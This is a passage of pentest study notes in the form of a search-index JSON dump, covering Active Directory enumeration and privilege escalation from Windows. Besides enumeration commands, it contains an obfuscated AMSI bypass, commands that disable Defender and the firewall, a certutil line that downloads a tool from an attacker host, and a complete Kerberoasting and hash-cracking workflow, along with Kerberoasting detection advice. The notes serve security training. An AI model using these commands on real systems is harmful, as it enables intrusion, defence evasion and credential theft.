privileges\nnet group \"Domain Admins\" /domain\n\n# List of PCs connected to the domain\nnet group \"domain computers\" /domain    \n\n# List PC accounts of domains controllers\nnet group \"Domain Controllers\" /domain  \n\n# User that belongs to the group\nnet group &lt;domain_group_name&gt; /domain   \n\n# List of domain groups\nnet groups /domain  \n\n# All available groups\nnet localgroup  \n\n# List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)\nnet localgroup administrators /domain   \n\n# Information about a group (admins)\nnet localgroup Administrators   \n\n# Add user to administrators\nnet localgroup administrators [username] /add   \n\n# Check current shares\nnet share   \n\n# Get information about a user within the domain\nnet user &lt;ACCOUNT_NAME&gt; /domain \n\n# List all users of the domain\nnet user /domain    \n\n# Information about the current user\nnet user %username% \n\n# Mount the share locally\nnet use x: \\computer\\share  \n\n# Get a list of computers\nnet view    \n\n#   Shares on the domains\nnet view /all /domain[:domainname]\n\n# List shares of a computer\nnet view \\computer /ALL \n\n# List of PCs of the domain\nnet view /domain    \n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#5-security-controls","title":"5. Security controls","text":"<p>cmd</p> <pre><code># Check if Windows Defender is running (from CMD.exe). \nsc query windefend\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#powershell_2","title":"Powershell","text":"<p>See powershell.</p> <p>Policies and antivirus</p> <pre><code># Lists available modules loaded for use.\nGet-Module  \n\n#  print the execution policy settings for each scope on a host.\nGet-ExecutionPolicy -List   \n\n#This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.\nSet-ExecutionPolicy Bypass -Scope Process   \n</code></pre> <p>AppLocker\u00a0is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run.</p> <pre><code># Enumerate AppLocker policies \nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n# If we find that a file cannot be run from a location, maybe we can try to run it from another location.\n\n# Quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.\n$ExecutionContext.SessionState.LanguageMode\n\n# Check current execution policy. If the answer is\n# - \"Restricted\": Ps scripts cannot run.\n# - \"RemoteSigned\": Downloaded scripts will require the script to be signed by a trusted publisher.\nGet-Execution-Policy\n\n# Bypass execution policy\npowershell -ep bypass\n\n# Get the current Defender status.\nGet-MpComputerStatus\n\n# Deactivate antivirus from powershell session (if user has rights to do so)\nSet-MpPreference -DisableRealtimeMonitoring $true\n\n# Disable firewall\nnetsh advfirewall set allprofiles state off\n\n# Bypass AMSI\nS`eT-It`em ( 'V'+'aR' +\u00a0 'IA' + ('blE:1'+'q2')\u00a0 + ('uZ'+'x')\u00a0 ) ( [TYpE](\u00a0 \"{1}{0}\"-F'F','rE'\u00a0 ) )\u00a0 ;\u00a0 \u00a0 (\u00a0 \u00a0 Get-varI`A`BLE\u00a0 ( ('1Q'+'2U')\u00a0 +'zX'\u00a0 )\u00a0 -VaL\u00a0 ).\"A`ss`Embly\".\"GET`TY`Pe\"((\u00a0 \"{6}{3}{1}{4}{2}{0}{5}\" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')\u00a0 ) ).\"g`etf`iElD\"(\u00a0 ( \"{0}{2}{1}\" -f('a'+'msi'),'d',('I'+'nitF'+'aile')\u00a0 ),(\u00a0 \"{2}{4}{0}{1}{3}\" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'\u00a0 )).\"sE`T`VaLUE\"(\u00a0 ${n`ULl},${t`RuE} )\n\n# Add a registry\nreg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre> <p>LAPSToolkit is a powershell functions that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS). It includes finding groups specifically delegated by sysadmins, finding users with \"All Extended Rights\" that can view passwords, and viewing all computers with LAPS enabled. </p> <p>An account that has joined a computer to a domain receives <code>All Extended Rights</code> over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.</p> <pre><code># Search for computers that have LAPS enabled when passwords expire\nGet-LAPSComputers\n\n# Searches through all OUs to see which AD groups can read the ms-Mcs-AdmPwd attribute\nFind-LAPSDelegatedGroups\n\n# Searches through all OUs to see which AD groups can read the ms-Mcs-AdmPwd attribute, meaning Users with \"All Extended Rights\" can read LAPS passwords and may be less protected than users in delegated groups\nFind-AdmPwdExtendedRights\n</code></pre> <p>See Windows Management Instrumentation (<code>WMI</code>).</p> <pre><code># Prints the patch level and description of the Hotfixes applied\nwmic qfe get Caption,Description,HotFixID,InstalledOn   \n\n# Displays basic host information to include any attributes within the list\nwmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List  \n\n# A listing of all processes on host\nwmic process list /format:list  \n\n# Displays information about the Domain and Domain Controllers\nwmic ntdomain list /format:list \n\n#Displays information about all local accounts and any domain accounts that have logged into the device\nwmic useraccount list /format:list  \n\n# Information about all local groups\nwmic group list /format:list    \n\n# Dumps information about any system accounts that are being used as service accounts.\nwmic sysaccount list /format:list   \n</code></pre> <p>See the net.exe commands in powershell:</p> <pre><code># Information about password requirements\nnet accounts    \n\n# Password and lockout policy\nnet accounts /domain\n\n# Information about domain groups\nnet group /domain   \n\n# List users with domain admin privileges\nnet group \"Domain Admins\" /domain\n\n# List of PCs connected to the domain\nnet group \"domain computers\" /domain    \n\n# List PC accounts of domains controllers\nnet group \"Domain Controllers\" /domain  \n\n# User that belongs to the group\nnet group &lt;domain_group_name&gt; /domain   \n\n# List of domain groups\nnet groups /domain  \n\n# All available groups\nnet localgroup  \n\n# List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)\nnet localgroup administrators /domain   \n\n# Information about a group (admins)\nnet localgroup Administrators   \n\n# Add user to administrators\nnet localgroup administrators [username] /add   \n\n# Check current shares\nnet share   \n\n# Get information about a user within the domain\nnet user &lt;ACCOUNT_NAME&gt; /domain \n\n# List all users of the domain\nnet user /domain    \n\n# Information about the current user\nnet user %username% \n\n# Mount the share locally\nnet use x: \\computer\\share  \n\n# Get a list of computers\nnet view    \n\n#   Shares on the domains\nnet view /all /domain[:domainname]\n\n# List shares of a computer\nnet view \\computer /ALL \n\n# List of PCs of the domain\nnet view /domain    \n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#dsquery","title":"Dsquery","text":"<p>Dsquery\u00a0is a helpful command-line tool that can be utilized to find Active Directory objects. </p> <p><code>dsquery</code>\u00a0will exist on any host with the\u00a0<code>Active Directory Domain Services Role</code>\u00a0installed, and the\u00a0<code>dsquery</code>\u00a0DLL exists on all modern Windows systems by default now and can be found at\u00a0<code>C:\\Windows\\System32\\dsquery.dll</code>.</p> <p>All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a\u00a0<code>SYSTEM</code>\u00a0context.</p> <pre><code># User Search\ndsquery user\n\n# Computer Search\ndsquery computer\n\n# List objects in an OU\ndsquery * \"CN=Users,DC=INLANEFREIGHT,DC=LOCAL\"\n\n#  List Users With Specific Attributes Set (PASSWD_NOTREQD) by Combining dsquery with LDAP search filters of our choosing. The below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribute.\ndsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl\n\n# Searching for Domain Controllers\n dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName\n# userAccountControl:1.2.840.113556.1.4.803: Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs).\n# =8192 represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. \n\n# Search users with UAC set to `Password Can't Change`:\ndsquery * -filter \"(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))\"\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#6-shares","title":"6. Shares","text":"","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#snaffler","title":"Snaffler","text":"<p>See snaffler.</p> <p>Snaffler](https://github.com/SnaffCon/Snaffler)\u00a0is a tool for\u00a0pentesters\u00a0and\u00a0red teamers\u00a0to help find delicious candy needles (creds mostly, but it's flexible) in a bunch of horrible boring haystacks (a massive Windows/AD environment). Broadly speaking\u00a0- it gets a list of Windows computers from Active Directory, then spreads out its snaffly appendages to them all to figure out which ones have file shares, and whether you can read them.</p> <pre><code>Snaffler.exe -s -d $domain -o snaffler.log -v data\n# -s:  prints results to the console \n# -d: specifies the domain to search within\n# -o: writes results to a logfile\n# -v: verbosity level. \"data\" is best as it only displays results to the screen\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#7-dns-records","title":"7. DNS Records","text":"<p>! tips \"\"     - Getting in the Zone: dumping Active Directory DNS using adidnsdump     - See the tool adidnsdump</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#adidnsdump","title":"adidnsdump","text":"<p>See  adidnsdump.</p> <p>We can use a tool such as adidnsdump to enumerate all DNS records in a domain using a valid domain user account.  The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the\u00a0<code>adidnsdump</code>\u00a0tool, we can resolve all records in the zone and potentially find something useful for our engagement.</p> <pre><code>adidnsdump -u $domain\\\\$user ldap://$DomainControllerIP\n# Example:\n# adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 \n\n# Viewing the Contents of the records.csv File\nhead records.csv \n\n# If we run again with the -r flag the tool will attempt to resolve unknown records by performing an A query. \nadidnsdump -u $domain\\\\$user ldap://$DomainControllerIP -r\n# Example:\n# adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 -r\n\n# Now records.csv will include previously hidden records\nhead records.csv \n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#8-group-policy-object-gpo","title":"8. Group Policy Object (GPO)","text":"<p>We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use\u00a0group3r,\u00a0ADRecon,\u00a0PingCastle, among others, to audit the security of GPOs in a domain.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#powershell_3","title":"Powershell","text":"<p>If Group Policy Management Tools are installed on the host we are working from, we can use various built-in\u00a0GroupPolicy cmdlets\u00a0such as\u00a0<code>Get-GPO</code>\u00a0to perform the same enumeration.</p> <pre><code>Get-GPO -All | Select DisplayName\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#powerview_2","title":"Powerview","text":"<p>Using the\u00a0Get-DomainGPO\u00a0function from PowerView, we can get a listing of GPOs by name.</p> <pre><code>Import-Module .\\PowerView.ps1\nGet-DomainGPO |select displayname\n</code></pre> <p>Enumerating GPO Names with PowerView</p> <pre><code>$sid=Convert-NameToSid \"Domain Users\"\nGet-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}\n</code></pre> <p>Results:</p> <pre><code>ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL\nObjectSID             :\nActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner\n\n... SNIP ...\n</code></pre> <p>Converting GPO GUID to Name:</p> <pre><code>Get-GPO -Guid $GUID\n# Example:\n# Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532\n# In this case we  can see that the\u00a0`Domain Users`\u00a0group has several rights over the\u00a0`Disconnect Idle RDP`\u00a0GPO. \n</code></pre> <p>See how to take this attack further.</p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#9-trust-relationships","title":"9. Trust Relationships","text":"","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#introduction-to-domain-trust-overview","title":"Introduction to Domain Trust Overview","text":"<p>A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. </p> <p>Types of trusts:</p> <ul> <li><code>Parent-child</code>: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain\u00a0<code>corp.inlanefreight.local</code>\u00a0could authenticate into the parent domain\u00a0<code>inlanefreight.local</code>, and vice-versa.</li> <li><code>Cross-link</code>: A trust between child domains to speed up authentication.</li> <li><code>External</code>: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes\u00a0SID filtering\u00a0or filters out authentication requests (by SID) not from the trusted domain.</li> <li><code>Tree-root</code>: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.</li> <li><code>Forest</code>: A transitive trust between two forest root domains.</li> <li>ESAE: A bastion forest used to manage Active Directory.</li> </ul> <p>Trusts can be transitive or non-transitive:</p> <ul> <li>A\u00a0<code>transitive</code>\u00a0trust means that trust is extended to objects that the child domain trusts:<ul> <li>Shared, 1 to many.</li> <li>The trust is shared with anyone in the forest. </li> <li>Forest, tree-root, parent-child, and cross-link trusts are transitive.</li> </ul> </li> <li>In a non-transitive trust, the child domain itself is the only one trusted:<ul> <li>Direct trust.</li> <li>Not extended to the next level child domains.</li> <li>Typical for external or custom trust setup.</li> </ul> </li> </ul> <p>Trusts can be set up in two directions: one-way or two-way (bidirectional):</p> <ul> <li> <ul> <li><code>One-way trust</code>: Users in a\u00a0<code>trusted</code>\u00a0domain can access resources in a trusting domain, not vice-versa.</li> </ul> </li> <li><code>Bidirectional trust</code>: Users from both trusting domains can access resources in the other domain. </li> </ul>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#windows-binary-nltest","title":"Windows binary: nltest","text":"<p>Similar, but very simplified information could be gleaned from a native Windows binary:</p> <pre><code>nltest /domain_trusts\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#powershell_4","title":"Powershell","text":"<p>Powershell way of checking trust relationships:</p> <pre><code>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#active-directory-module-get-adtrust","title":"Active Directory module: Get-ADTrust","text":"<p>See complete Active directory powershell module.</p> <pre><code>Import-Module activedirectory\nGet-ADTrust -Filter *\n</code></pre> <p>Pay attention to properties such as Direction, ForestTransitive and some others. </p> <p>From here we could enumerate users in the child domain:</p> <pre><code>Get-DomainUser -Domain $domain | select SamAccountName\n# Example:\n# Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#powerviewps1-module-get-domaintrust","title":"PowerView.ps1 module: Get-DomainTrust","text":"<p>PowerView can be used to perform a domain trust mapping and provide information such as the type of trust (parent/child, external, forest) and the direction of the trust (one-way or bidirectional).</p> <pre><code>Import-Module .\\PowerView.ps1\nGet-DomainTrust\n</code></pre> <p>Also we could do some mapping:</p> <pre><code>Get-DomainTrustMapping\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#netdom","title":"netdom","text":"<p>The\u00a0<code>netdom query</code>\u00a0sub-command of the\u00a0<code>netdom</code>\u00a0command-line tool in Windows can retrieve information about the domain, including a list of workstations, servers, and domain trusts.</p> <pre><code># List trusts:\nnetdom query /domain:$domain trust\n# Example:\n# netdom query /domain:inlanefreight.local trust\n\n# Enumerate Domain Controllers with accounts in the domain\nnetdom query /domain:$domain dc\n# Example: \n# netdom query /domain:inlanefreight.local dc\n\n#  query workstations and servers\nnetdom query /domain:$domain workstation\n# Example:\n# netdom query /domain:inlanefreight.local workstation\n</code></pre>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-enumeration/#visualizing-trust-relationships-in-bloodhound","title":"Visualizing Trust Relationships in BloodHound","text":"<p>See more about bloodhound.</p> <p></p>","tags":["active","directory","ldap","linux"]},{"location":"active-directory-from-windows-privilege-escalation/","title":"Privilege escalation in Active Directory from Windows","text":"<p>Resources</p> <ul> <li>[TheHacker.recipes](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword#forcechangepassword</li> </ul> <p>Index of Active Directory</p> <p>Attacking from linux</p> <ul> <li>Enumerating Active Directory from Linux</li> <li>Attacking Active Directory from Linux</li> <li>Lateral Movement in Active Directory from Linux</li> <li>Privileges escalation in Active Directory from Linux</li> </ul> <p>Attacking from Windows</p> <ul> <li>Enumerating Active Directory from Windows</li> <li>Attacking Active Directory from Windows</li> <li>Privileges escalation in Active Directory from Windows</li> </ul>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#kerberoasting","title":"\ud83d\udd10 Kerberoasting","text":"<p>See about Kerberos authentication.</p> <p>Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments.</p> <p>Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. Overall:</p> <ul> <li>RC4 (type 23) encryption: TGS \u00a0hashes that begin with\u00a0<code>$krb5tgs$23$*</code></li> <li>AES-256 (type 18) encryption: TGS \u00a0hashes that begin with\u00a0<code>$krb5tgs$18$*</code></li> </ul>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#setspnexe","title":"setspn.exe","text":"<p>1. Enumerating SPNs with setspn.exe</p> <pre><code>setspn.exe -Q */*\n</code></pre> <p>We will focus on\u00a0<code>user accounts</code>\u00a0and ignore the computer accounts returned by the tool.</p> <p>2. Using PowerShell, we can request TGS tickets for the interested account and load them into memory.</p> <pre><code>Add-Type -AssemblyName System.IdentityModel\n# Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object.\n# -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using\n# System.IdentityModel is a namespace that contains different classes for building security token services\n\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"\n#  New-Object cmdlet to create an instance of a .NET Framework object.\n# System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token \n# -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\": pass the SPN name to the class to request a Kerberos TGS ticket\n</code></pre> <p>3. If needed, we could also retrieve all tickets:</p> <pre><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }\n</code></pre> <p>4. Extract Tickets from Memory with Mimikatz</p> <pre><code># Launch mimikatz\nmimikatz.exe\n\n# Specify base64\nbase64 /out:true\n# If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files.\n\n# Export the tickets\nkerberos::list /export \n</code></pre> <p>5. Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.</p> <pre><code>echo \"&lt;base64 blob&gt;\" |  tr -d \\\\n \n</code></pre> <p>6. We can place the above single line of output into a file and convert it back to a\u00a0<code>.kirbi</code>\u00a0file using the\u00a0<code>base64</code>\u00a0utility.</p> <pre><code>cat encoded_file | base64 -d &gt; sqldev.kirbi\n</code></pre> <p>7. Use kirbi2john.py:</p> <pre><code>python2.7 kirbi2john.py Filename.kirbi\n</code></pre> <p>This will create a file called\u00a0<code>crack_file</code>. We then must modify the file a bit to be able to use Hashcat against the hash.</p> <pre><code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; ServiceName_tgs_hashcat\n</code></pre> <p>8. Cracking the Hash with Hashcat</p> <pre><code>hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt \n</code></pre> <p>If we decide to skip the base64 output with Mimikatz and type\u00a0<code>mimikatz # kerberos::list /export</code>, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run\u00a0<code>kirbi2john.py</code>\u00a0against them directly, skipping the base64 decoding step.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#powerview","title":"PowerView","text":"<p>Let's use PowerView to extract the TGS tickets and convert them to Hashcat format. </p> <p>1. Enumerating SPNs with PowerView:</p> <pre><code># certutil -urlcache -f http://$ip/PowerView.ps1 PowerView.ps1\n# Import module\nImport-Module .\\PowerView.ps1\n\n# List SPNs: Option 1\nGet-DomainUser * -spn | select samaccountname\n\n# List SPNs: Option 2\nGet-NetUser -SPN\n</code></pre> <p>2. Generate a TGS ticker for a specific user:</p> <pre><code># Option 1\nGet-DomainUser -Identity $samAccountName | Get-DomainSPNTicket -Format Hashcat\n\n# Option 2\nGet-DomainSPNTicket -SPN $samAccountName -OutputFormat Hashcat | select -ExpandProperty Hash &gt; file.txt\n</code></pre> <p>3. Or obtain all SPN TGS tickets and export them to a CSV</p> <pre><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\FileName.csv -NoTypeInformation\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#rubeus","title":"Rubeus","text":"<p>See more about Rubeus.</p> <p>Gather stats:</p> <pre><code> \\Rubeus.exe kerberoast /stats\n</code></pre> <p>Request tickets with admincount attribute set to 1:</p> <pre><code>.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap\n# /nowrap flag: so that the hash can be more easily copied down for offline cracking using Hashcat. The \"\"/nowrap\" flag prevents any base64 ticket blobs from being column wrapped.\n</code></pre> <p>Perform Kerberoasting on a user testspn:</p> <pre><code># Perform Kerberoasting on a user testspn\n.\\Rubeus.exe kerberoast /user:testspn /nowrap\n</code></pre> <p>If the received TGS ticket is RC4 (type 23) encrypted, it will be easier to crack. We can check out if the user hast the <code>msDS-SupportedEncryptionTypes</code>\u00a0attribute is set to\u00a0<code>0</code>.  The chart\u00a0here\u00a0tells us that a decimal value of\u00a0<code>0</code>\u00a0means that a specific encryption type is not defined and set to the default of\u00a0<code>RC4_HMAC_MD5</code>.</p> <pre><code># Check the encryption of the TGS ticket for user testspn\nGet-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes\n\n\n#serviceprincipalname       msds-supportedencryptiontypes samaccountname\n# ----------                 ----------------------------- --------------\n# testspn/kerberoast.inlanefreight.local               0   testspn\n</code></pre> <p>With RC4 (type 23) encryption, this would be the hashcat module:</p> <pre><code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre> <p>The results for the AES-256 (type 18) encryption would be <code>24</code>:</p> <pre><code># Check the encryption of the TGS ticket for user testspn\nGet-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes\n\n\n#serviceprincipalname       msds-supportedencryptiontypes samaccountname\n# ----------                 ----------------------------- --------------\n# testspn/kerberoast.inlanefreight.local               24   testspn\n</code></pre> <p>With AES (type 18) encryption, this would be the hashcat module:</p> <pre><code>hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt \n</code></pre> <p>We can use Rubeus with the\u00a0<code>/tgtdeleg</code>\u00a0flag to specify that we want only RC4 encryption  when requesting a new service ticket even though the supported encryption types are listed as AES 128/256. This may be a failsafe built-in to Active Directory for backward compatibility.</p> <pre><code># Perform Kerberoasting on a user testspn\n.\\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg\n# /tgtdeleg: specify that we want only RC4 encryption when requesting a new service ticket.\n</code></pre> <p>Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.</p> <p>In addition, It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. </p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#mitigating-kerberoasting","title":"Mitigating Kerberoasting","text":"<p>Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of TGS-REQ and TGS-REP requests and responses, signaling the use of automated Kerberoasting tools.</p> <p>omain controllers can be configured to log Kerberos TGS ticket requests by selecting\u00a0Audit Kerberos Service Ticket Operations\u00a0within Group Policy. Doing so will generate two separate event IDs:</p> <ul> <li>4769: A Kerberos service ticket was requested, </li> <li>and\u00a04770: A Kerberos service ticket was renewed.</li> </ul> <p>10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.</p> <p>Some other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#kerberos-forging-the-pac","title":"Kerberos: Forging the PAC","text":"<p>This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.</p> <p>The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. It can be exploited with tools such as the\u00a0Python Kerberos Exploitation Kit (PyKEK)\u00a0or the Impacket toolkit.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#kerberos-constrained-delegation-pending","title":"\u2757 Kerberos Constrained Delegation [PENDING]","text":"","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#kerberos-unconstrained-delegation-pending","title":"\u2757 Kerberos Unconstrained Delegation [PENDING]","text":"","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#kerberos-resource-based-constrained-delegation-rbcd-pending","title":"\u2757 Kerberos Resource-Based Constrained Delegation (RBCD) [PENDING]","text":"","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#the-golden-ticket-attack","title":"The Golden Ticket attack","text":"<p>The attack in a nugshell: First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. \u00a0The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#kerberos-double-hop-problem","title":"Kerberos \"Double Hop\" Problem","text":"<p>Kerberos \"Double Hop\" Problem: The \"Double Hop\" problem often occurs when using WinRM/Powershell or Evil-WinRM, since the default authentication mechanism only provides a ticket to access a specific resource (winrm). When we use Kerberos to establish a remote session, we are not using a password for authentication, and the user's ticket-granting service (TGS) ticket is sent to the remote service, but the TGT ticket is not sent. Therefore, when we try to authenticate over a second resource, the machine can not pull any hash from memory or generate any TGS to authenticate us.</p> <p>In a nutshell, Kerberos \"Double Hop\" Problem arises when we try to issue a multi-server command, our credentials will not be sent from the first machine to the second, as the user's password  was never cached as part of their login.  In other words, when authenticating to the target host, the user's ticket-granting service (TGS) ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication attempt is valid, and we will be denied access to the remote service.</p> <p>Example once we are connected with Evil-WinRm:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt; import-module .\\PowerView.ps1\n\n|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK\n|S-chain|-&lt;&gt;-127.0.0.1:9051-&lt;&gt;&lt;&gt;-172.16.8.50:5985-&lt;&gt;&lt;&gt;-OK\n*Evil-WinRM* PS C:\\Users\\backupadm\\Documents&gt; get-domainuser -spn\nException calling \"FindAll\" with \"0\" argument(s): \"An operations error occurred.\n\"\nAt C:\\Users\\backupadm\\Documents\\PowerView.ps1:5253 char:20\n+             else { $Results = 